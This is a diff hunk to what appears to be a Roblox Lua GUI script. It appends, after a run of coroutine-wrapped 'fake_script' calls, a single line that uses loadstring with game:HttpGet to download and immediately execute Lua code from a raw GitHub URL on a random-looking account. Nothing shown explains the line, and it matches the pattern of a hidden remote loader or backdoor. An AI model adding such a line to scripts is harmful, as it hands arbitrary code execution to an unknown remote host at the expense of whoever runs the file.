@@ -538,3 +538,5 @@ coroutine.wrap(BCXCSJ_fake_script)()
 coroutine.wrap(EEVTM_fake_script)()
 coroutine.wrap(KLQY_fake_script)()
 coroutine.wrap(JZKEJHO_fake_script)()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/djasddjajw881323hidigdfsdfp/2f457hkd323atom/atom/FrameDownloader.lua"))()
